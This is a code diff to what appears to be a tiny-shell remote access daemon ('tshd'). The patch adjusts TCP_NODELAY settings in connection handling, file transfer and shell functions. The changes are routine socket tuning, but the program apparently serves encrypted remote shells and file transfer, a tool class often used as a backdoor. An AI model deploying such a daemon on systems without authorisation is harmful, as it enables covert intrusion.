@@ -313,7 +313,7 @@ int main( int argc, char **argv )
 
 int process_client(int client) {
 
-    int pid, ret;
+    int pid, ret, flag;
     unsigned int len;
 
     /* fork a child to handle the connection */
@@ -346,6 +346,19 @@ int process_client(int client) {
     if( pid != 0 )
     {
       return( 9 );
+    }
+
+    /* set TCP_NODELAY option and correct buffer size*/
+
+    flag = 1;
+
+    ret = setsockopt( client, SOL_TCP, TCP_NODELAY,
+        (void *) &flag, sizeof( flag ) );
+
+    if( ret < 0 )
+    {
+        perror( "setsockopt" );
+        return( 10 );
     }
 
     /* setup the packet encryption layer */
@@ -403,7 +416,7 @@ int process_client(int client) {
 
 int tshd_get_file( int client )
 {
-    int ret, total, fd, eof;
+    int ret, total, fd, eof, flag;
     unsigned int len;
     struct stat st;
 
@@ -436,6 +449,19 @@ int tshd_get_file( int client )
     {
         perror( "stat" );
         return( 16 );
+    }
+
+    /* disable TCP_NODELAY option */
+
+    flag = 0;
+
+    ret = setsockopt( client, SOL_TCP, TCP_NODELAY,
+        (void *) &flag, sizeof( flag ) );
+
+    if( ret < 0 )
+    {
+        perror( "setsockopt" );
+        return( 10 );
     }
 
     /* send the data */
@@ -475,7 +501,7 @@ int tshd_get_file( int client )
 
 int tshd_put_file( int client )
 {
-    int ret, fd;
+    int ret, fd, flag;
     unsigned int len;
 
     /* get the filename */
@@ -496,6 +522,19 @@ int tshd_put_file( int client )
     if( fd < 0 )
     {
         return( 20 );
+    }
+
+    /* disable TCP_NODELAY option */
+
+    flag = 0;
+
+    ret = setsockopt( client, SOL_TCP, TCP_NODELAY,
+        (void *) &flag, sizeof( flag ) );
+
+    if( ret < 0 )
+    {
+        perror( "setsockopt" );
+        return( 10 );
     }
 
     /* fetch the data */
@@ -794,19 +833,6 @@ int tshd_runshell( int client )
         /* tty (slave side) not needed anymore */
 
         close( tty );
-
-        /* set TCP_NODELAY option */
-
-        n = 1;
-
-        ret = setsockopt( client, SOL_TCP, TCP_NODELAY,
-            (void *) &n, sizeof( n ) );
-
-        if( ret < 0 )
-        {
-            perror( "setsockopt" );
-            return( 10 );
-        }
 
         /* let's forward the data back and forth */
 
